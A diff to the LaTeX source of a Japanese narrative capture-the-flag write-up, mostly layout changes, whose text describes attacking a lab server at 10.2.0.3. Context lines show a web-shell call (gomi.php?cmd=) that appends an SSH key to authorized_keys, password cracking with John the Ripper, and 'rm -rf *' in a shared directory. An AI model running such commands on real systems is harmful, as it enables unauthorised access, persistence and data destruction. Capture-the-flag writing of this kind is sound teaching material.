@@ -45,6 +45,8 @@ Apacheのファイル一覧が露呈している。
 
 \url{http://10.2.0.3/stage1.cgi}へアクセスすると、日本語と英語が切り替えられるだけのページが出現した。
 
+\columnbreak
+
 \lstinputlisting[style=html]{src/2/stage1.cgi.html}
 
 試しに英語へ切り替えると、
@@ -77,7 +79,7 @@ File not found. [./stage2/.htpasswd.txt]
 「John The Ripper\footnote{総当たりと辞書攻撃によるパスワードクラックツールのこと。}を使おう」
 
 は？John The Ripperだと？
-確かにこいつはどう見てもハッシュ値、復号化は無理。
+確かにこいつはどう見てもハッシュ値、復号は無理。
 となれば、John The Ripperということになるが……。
 こんなことしている時間なんてあるのか？
 
@@ -249,6 +251,8 @@ $ ssh-keygen -f ~/.ssh/id_rsa.gomi
 
 \end{multicols}
 
+\newpage
+
 \begin{lstlisting}
 http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G1jx0M
 6Fw7ybYhKuMNlDrG/6sFyifFWO+XdmowzSj+L4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKIlhCBxD78VBS6+f
@@ -303,19 +307,6 @@ $ perl -MURI::Escape -E 'say uri_escape("+")'
 後は\ctt{id\_rsa.gomi.pub}の\ctt{+}を\ctt{\%2B}へ置換したものを流し込めばよい。
 この程度の置換であれば、Vimの機能で一撃だ。
 すぐさま置換したものを\ctt{authorized\_keys}へ書き込む。
-
-%\end{multicols}
-%
-%\begin{lstlisting}
-%http://10.2.0.3/stage3xYz/images/gomi.php?cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQ/02G
-%1jx0M6Fw7ybYhKuMNlDrG/6sFyifFWO%2BXdmowzSj%2BL4Ip4LpZer1xCINJWJpcGGeIy1JqcoXDagA70yqWWO9qcstCdSKI
-%lhCBxD78VBS6%2BftvHXpmM7818npSKGy0yeKaajNIEYQYKUGVYVDcLKWEFXY2utDd2wV3M2BRsEZZyu7jlBOqtfEeQbou3so
-%36lIipM4FAWaZGzcNtnN40xfQLG1twuDTvxYINqTwbezRueYQXghIWTrD3fyWEDH86BsaQ6oN68XD0sscHuI4IC3/R19afZKi
-%ti8mHqwmC5JODpZ2McUGzwZIqm55c/h83YP1izckJqaKW7pg9V yoshimura_yuu@yoshimura-yuu.local" >> 
-%/home/stage4/.ssh/authorized_keys
-%\end{lstlisting}
-%
-%\begin{multicols}{2}
 
 そして二回目の、
 
@@ -387,6 +378,8 @@ gomi.php index.html a.php hogehoge.cgi key.png test.php gomi.php attack.php
 おーぴーなどが適当にアップロードしたにしては流石に多過ぎだ。
 もしかして、これ、あらゆるチームが同じサーバーへ攻撃しているのか？
 ならば俺のやるべきことは、
+
+\columnbreak
 
 \begin{lstlisting}
 [stage4@localhost images]$ rm -rf *
